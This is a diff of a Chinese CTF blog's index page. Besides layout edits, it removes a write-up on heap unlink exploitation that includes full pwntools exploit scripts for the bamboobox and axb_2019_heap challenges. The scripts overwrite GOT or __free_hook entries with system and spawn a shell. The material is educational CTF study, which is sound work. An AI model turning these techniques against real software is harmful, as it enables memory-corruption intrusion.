@@ -25,7 +25,7 @@
     <link rel="alternative" href="/atom.xml" title="NEWYM" type="application/atom+xml">
   
   
-    <link rel="icon" href="/favicon.ico">
+    <link rel="icon" href="/assets/bs.jpg">
   
   
     <link rel="apple-touch-icon" href="/apple-touch-icon-180x180.png">
@@ -63,7 +63,7 @@
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="/img/head.jpg" class="js-avatar">
+			<img src="/assets/bs.jpg" class="js-avatar">
 		</a>
 		<hgroup>
 			<h1 class="header-author"><a href="/">NEWYM</a></h1>
@@ -74,10 +74,6 @@
 			<ul>
 			
 				<li><a href="/" target="_blank">主页</a></li>
-			
-				<li><a href="https://zhousiwei.gitee.io/ibooks/" target="_blank">技术笔记</a></li>
-			
-				<li><a href="/tags/%E9%9A%8F%E7%AC%94/" target="_blank">随笔</a></li>
 			
 			</ul>
 		</nav>
@@ -134,7 +130,7 @@
 		<header id="header" class="inner">
 			<div class="profilepic">
 				<a href="/">
-					<img src="/img/head.jpg" class="js-avatar">
+					<img src="/assets/bs.jpg" class="js-avatar">
 				</a>
 			</div>
 			<hgroup>
@@ -142,10 +138,6 @@
 			</hgroup>
 			
 			
-			
-				
-			
-				
 			
 				
 			
@@ -168,14 +160,10 @@
 			</nav>
 
 			<nav class="header-menu js-header-menu">
-				<ul style="width: 70%">
+				<ul style="width: 50%">
 				
 				
-					<li style="width: 33.333333333333336%"><a href="/">主页</a></li>
-		        
-					<li style="width: 33.333333333333336%"><a target="_blank" rel="noopener" href="https://zhousiwei.gitee.io/ibooks/">技术笔记</a></li>
-		        
-					<li style="width: 33.333333333333336%"><a href="/tags/%E9%9A%8F%E7%AC%94/">随笔</a></li>
+					<li style="width: 100%"><a href="/">主页</a></li>
 		        
 				</ul>
 			</nav>
@@ -194,126 +182,16 @@
             
 
   
-    <article id="post-“666”" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-unlink" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
-      <header class="article-header">
-  
-  
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/2024/11/06/%E2%80%9C666%E2%80%9D/" target="_blank">“666”</a>
-  
-    </h1>
-  
-
-
-  
-  
-<a href="/2024/11/06/%E2%80%9C666%E2%80%9D/" class="archive-article-date">
-        <time datetime="2024-11-06T08:18:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-11-06</time>
-</a>
-
-  
-  
-    
-
-  
-  </header>
-  
   <div class="article-entry" itemprop="articleBody">
     
-    <span id="more"></span>
-
-<p>unlink机制的攻击利用：</p>
+    <h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>unlink机制的攻击利用：</p>
 <p>我们伪造一个fake chunk，修改其fd为p-0x18（p储存堆块指针的地址，一般为bss段),修改bk为p-0x10,绕过保护，在形成双链表的过程中，修改了p-&gt;p-0x18导致我们可以修改p-&gt;任意地址，进行一次任意地址写，可以修改free为system。</p>
-<!--more-->
-
-<p>伪造形式</p>
-<p><img src="/../phto/1721902249398.png" alt="1721902249398"></p>
-<p>伪造堆块的后一堆块的size低位要为0，这样会认为我们伪造的堆块是释放的，才能往前合并。</p>
-<p><img src="/../phto/1721902258842.png" alt="1721902258842"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">首先我们要绕过保护</span><br><span class="line">B-&gt;bk!=chunk0||A-&gt;fd!=chunk0</span><br><span class="line">//此时我们的A=p-0x10   fd=A+0x10   fd=p     (这个fd是A的fd)</span><br><span class="line">//此时我们的B=p-0x18   bk=B+0x18   bk=p    （这个bk是B的bk）</span><br><span class="line">//对应了下面的步骤</span><br><span class="line">chunk0-&gt;fd=p-0x18//这里的p-0x18是我们自己构造的</span><br><span class="line">chunk0-&gt;bk=p-0x10//同理</span><br><span class="line">B-&gt;bk=*（p-0x18+0x18）=*p=chunk0//证明了s=p</span><br><span class="line">A-&gt;fd=*（p+0x10+0x10）=*p=chunk0</span><br><span class="line">//此时*p等于chunk0的话便可以绕过保护</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这里我要提出一个问题了</p>
-<p>为什么我们要伪造堆块而不用原堆块呢？</p>
-<p>你要想一下我们绕过保护的要求是什么，最终我们回到的地方是chunk0，而最开始我们指向的是原堆块的数据区，我们是无法指到头部的，而我们构造的正好是可以指向头部的</p>
-<p><img src="/../phto/1721902391041.png" alt="1721902391041"></p>
-<p>&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;</p>
-<p><img src="/../phto/1721902400175.png" alt="1721902400175"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//在使AB构成双链表</span><br><span class="line">B-&gt;bk=A</span><br><span class="line">A-&gt;fd=B</span><br><span class="line">//此时A=p-0x10  B=0x18</span><br><span class="line">//等同于*p=p-0x10</span><br><span class="line">//然后*p=p-0x18</span><br><span class="line">//最终p会指向p-0x18的位置</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../phto/1721902409108.png" alt="1721902409108"></p>
-<p><img src="/../phto/1721902420223.png" alt="1721902420223"></p>
-<p>们在读入的时候就会往从p-0x18的位置开始读入，最后覆盖掉读入位置，在进行读入就从*p进行读入，相当于一次任意地址写</p>
-<p>例如我们覆盖到读入位置为atoi函数的got表，</p>
-<p><img src="/../phto/1721902458602.png" alt="1721902458602"></p>
-<p>我们下次就会对这里进行修改</p>
-<p>然后读入的内容从</p>
-<p><img src="/../phto/1721902464672.png" alt="1721902464672"></p>
-<p>这里读入</p>
-<p>那么我们就可以覆盖got表了</p>
-<p><img src="/../phto/1721902473666.png" alt="1721902473666"></p>
-<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><h2 id="bamboobox"><a href="#bamboobox" class="headerlink" title="bamboobox"></a>bamboobox</h2><p>首先查看保护</p>
-<p><img src="/../phto/1721902481952.png" alt="1721902481952"></p>
-<p>64位开启了canary和nx保护</p>
-<p>查看ida</p>
-<p><img src="/../phto/1721902492107.png" alt="1721902492107"></p>
-<p>菜单题</p>
-<p><img src="/../phto/1721902499090.png" alt="1721902499090"></p>
-<p>show函数内，我们查看一下打印的位置bss1在哪里，这里是我们随后创造第一个堆块的索引位置（重点关注）</p>
-<p><img src="/../phto/1721902506238.png" alt="1721902506238"></p>
-<p>查看add函数，创造指定大小堆块，将堆块索引位置放到itemlist的位置，这里我们就知道堆块地址在这个bss段放置了，而且前面的show也是打印itemlist+8的位置</p>
-<p>且add里的read函数也是往itemlist+8的位置读入，也就是对堆块读入内容</p>
-<p><img src="/../phto/1721902515323.png" alt="1721902515323"></p>
-<p>在change函数中存存在自己规定大小的堆溢出，可以用于修改后面堆块的pre_size（前一个堆块的大小）size自己堆块的大小（主要改成地位为0，将前一个堆块标记为释放状态）</p>
-<p>free释放函数</p>
-<p><img src="/../phto/1721902523130.png" alt="1721902523130"></p>
-<p>思路：</p>
-<p>1.部署堆块（fk&#x3D;itemlist-0x18，bk&#x3D;itemlist-0x10），并设置后一个堆块标识位（size低位为0）</p>
-<p>2.然后释放后itemlist+8的位置会指向fk的位置，这时候覆盖到itemlist+8，即可任意读写（覆盖为atoi_got）</p>
-<p>3.然后show打印出atoi的got表地址，根据偏移可以找到system</p>
-<p>4.这时候读入取覆盖安atoi的got表为stystem即可</p>
-<p>部署的堆块</p>
-<p><img src="/../phto/1721902530132.png" alt="1721902530132"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">target = 0x6020c8  </span><br><span class="line">fd = target - 0x18</span><br><span class="line">bk = target - 0x10</span><br><span class="line">payload = p64(0)+p64(0x81)+p64(fd)+p64(bk)+b&#x27;a&#x27;*0x60+p64(0x80)+p64(0x90)</span><br><span class="line">change(0,payload)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../phto/1721902539830.png" alt="1721902539830"></p>
-<p>然后释放，itemlist+8指向了itemlist-0x18的位置，此时我们读入就从itemlist-0x18读入，可以覆盖到itemlist+8，即可任意读写</p>
-<p><img src="/../phto/1721902547094.png" alt="1721902547094"></p>
-<p>我们读入地址覆盖itemlist+8为atoi</p>
-<p><img src="/../phto/1721902553039.png" alt="1721902553039"></p>
-<p>先打印获得libc地址，找到system地址</p>
-<p><img src="/../phto/1721902558028.png" alt="1721902558028"></p>
-<p>修改atoigot表为system</p>
-<p><img src="/../phto/1721902570878.png" alt="1721902570878"></p>
-<p>这时候就成功了</p>
-<p>最终的exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from tools import *</span><br><span class="line">p = process(&#x27;./bam&#x27;)</span><br><span class="line">#p=remote(&quot;node3.buuoj.cn&quot;,27073)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">elf = ELF(&quot;./bam&quot;)</span><br><span class="line">#libc = ELF(&quot;./buu/libc64/libc-2.30.so&quot;)</span><br><span class="line">libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">atoi_got = elf.got[&#x27;atoi&#x27;]</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    p.recvuntil(&quot;Your choice:&quot;)</span><br><span class="line">    p.sendline(str(1))</span><br><span class="line"></span><br><span class="line">def alloc(size,content):</span><br><span class="line">    p.recvuntil(&quot;Your choice:&quot;)</span><br><span class="line">    p.sendline(str(2))</span><br><span class="line">    p.recvuntil(&quot;length of item name:&quot;)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(&quot;name of item:&quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def change(idx,content):</span><br><span class="line">    p.recvuntil(&quot;Your choice:&quot;)</span><br><span class="line">    p.sendline(str(3))</span><br><span class="line">    p.recvuntil(&quot;index of item:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(&quot;length of item name:&quot;)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(&quot;new name of the item:&quot;)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    p.recvuntil(&quot;Your choice:&quot;)</span><br><span class="line">    p.sendline(str(4))</span><br><span class="line">    p.recvuntil(&quot;index of item:&quot;)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">alloc(0x80,&quot;aaaa&quot;)</span><br><span class="line">alloc(0x80,&quot;bbbb&quot;)</span><br><span class="line">alloc(0x80,&quot;cccc&quot;)</span><br><span class="line"></span><br><span class="line">target = 0x6020c8  </span><br><span class="line">fd = target - 0x18</span><br><span class="line">bk = target - 0x10</span><br><span class="line">payload = p64(0)+p64(0x81)+p64(fd)+p64(bk)+b&#x27;a&#x27;*0x60+p64(0x80)+p64(0x90)</span><br><span class="line">change(0,payload)</span><br><span class="line">debug(p)</span><br><span class="line">free(1)</span><br><span class="line">atoi_got=elf.got[&quot;atoi&quot;]</span><br><span class="line"></span><br><span class="line">payload1=p64(0)*3+p64(atoi_got)</span><br><span class="line">change(0,payload1)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">stack=u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">log_addr(&quot;stack&quot;)</span><br><span class="line">libc_addr=stack-libc.sym[&#x27;atoi&#x27;]</span><br><span class="line">log_addr(&quot;libc_addr&quot;)</span><br><span class="line">system=libc_addr+libc.sym[&#x27;system&#x27;]</span><br><span class="line">log_addr(&quot;system&quot;)</span><br><span class="line"></span><br><span class="line">change(0,p64(system)*3)</span><br><span class="line">p.sendlineafter(&quot;choice:&quot;,b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h2><p>首先查看保护</p>
-<p><img src="/../phto/1721902578094.png" alt="1721902578094"></p>
-<p>保护全开</p>
-<p>查看ida</p>
-<p><img src="/../phto/1721902584179.png" alt="1721902584179"></p>
-<p>菜单题</p>
-<p>banner函数，存在格式化字符串漏洞，进行泄露程序地址和libc地址</p>
-<p><img src="/../phto/1721902590434.png" alt="1721902590434"></p>
-<p>查看add函数</p>
-<p><img src="/../phto/1721902617665.png" alt="1721902617665"></p>
-<p>delete噶不是故意，释放堆块并清空内容不存在uaf漏洞</p>
-<p><img src="/../phto/1721902628266.png" alt="1721902628266"></p>
-<p>看exit函数</p>
-<p><img src="/../phto/1721902634281.png" alt="1721902634281"></p>
-<p>思路：</p>
-<p>1.首先泄露程序地址和libc基地址</p>
-<p>2.如何构造堆块，并覆盖后一个堆块的pre_size和size位（size低位为0）</p>
-<p>3.释放使note指向note-0x18的位置，如何进行读入进行覆盖为free_hook为system</p>
-<p>(因为这题开了RELRO不能覆盖got表)</p>
-<p>最终的exp</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from tools import *</span><br><span class="line">p,e,libc=load(&quot;axb&quot;,&quot;node5.buuoj.cn:26141&quot;,&quot;./libc64/libc-2.23.so&quot;)</span><br><span class="line">context(log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(&quot;name: &quot;,b&#x27;%11$p--%15$p&#x27;)</span><br><span class="line">p.recvuntil(b&quot;Hello, &quot;)</span><br><span class="line">stack1=int(p.recv(14),16)</span><br><span class="line">log_addr(&quot;stack1&quot;)</span><br><span class="line">p.recvuntil(&quot;--&quot;)</span><br><span class="line">stack2=int(p.recv(14),16)</span><br><span class="line">log_addr(&quot;stack2&quot;)</span><br><span class="line">text_addr=stack1-0x1186</span><br><span class="line">log_addr(&quot;text_addr&quot;)</span><br><span class="line">libc_addr=stack2-libc.sym[&quot;__libc_start_main&quot;]-0xf0</span><br><span class="line">log_addr(&quot;libc_addr&quot;)</span><br><span class="line">free_got=libc_addr+libc.sym[&#x27;free&#x27;]</span><br><span class="line">log_addr(&quot;free_got&quot;)</span><br><span class="line">free_plt=text_addr+0x8a0</span><br><span class="line">log_addr(&quot;free_plt&quot;)</span><br><span class="line">system=libc_addr+libc.sym[&quot;system&quot;]</span><br><span class="line">log_addr(&quot;system&quot;)</span><br><span class="line">free1=libc_addr+libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">log_addr(&quot;free1&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(id,size,content):</span><br><span class="line">    p.sendlineafter(&quot;option:&quot;,&#x27;1&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;(0-10):&quot;,str(id))</span><br><span class="line">    p.sendlineafter(&quot;size:&quot;,str(size))</span><br><span class="line">    p.sendlineafter(&quot;content: &quot;,content)</span><br><span class="line"></span><br><span class="line">def dele(id):</span><br><span class="line">    p.sendlineafter(&quot;option:&quot;,&#x27;2&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;index:&quot;,str(id))</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    p.sendlineafter(&quot;option:&quot;,&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line">def exit(id,content):</span><br><span class="line">    p.sendlineafter(&quot;option:&quot;,&#x27;4&#x27;)</span><br><span class="line">    p.sendlineafter(&quot;index:&quot;,str(id))</span><br><span class="line">    p.sendlineafter(&quot;content: &quot;,content)</span><br><span class="line"></span><br><span class="line">target=0x0202060+text_addr</span><br><span class="line">fd=target-0x18</span><br><span class="line">bk=target-0x10</span><br><span class="line">add(0,0x98,&quot;aaaa&quot;)</span><br><span class="line">add(1,0x98,&quot;bbbb&quot;)</span><br><span class="line">add(2,0x98,b&quot;/bin/sh\x00&quot;)</span><br><span class="line"></span><br><span class="line">log_addr(&quot;target&quot;)</span><br><span class="line">log_addr(&quot;fd&quot;)</span><br><span class="line">log_addr(&quot;bk&quot;)</span><br><span class="line"></span><br><span class="line">payload=p64(0)+p64(0x90)+p64(fd)+p64(bk)+b&#x27;a&#x27;*0x70+p64(0x90)+p64(0xa0)</span><br><span class="line">exit(0,payload)</span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">debug(p)</span><br><span class="line">exit(0,p64(0)*3+p64(free1)+p64(0x8))</span><br><span class="line">exit(0,p64(system))</span><br><span class="line">dele(2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
+    
+    <a class="article-more-a" href="/2024/11/06/unlink/#more">more >></a>
+    
     
 
     
@@ -328,7 +206,7 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2024/11/06/%E2%80%9C666%E2%80%9D/">展开全文 >></a>
+      <a class="article-more-a" href="/2024/11/06/unlink/">展开全文 >></a>
     </p>
     
 
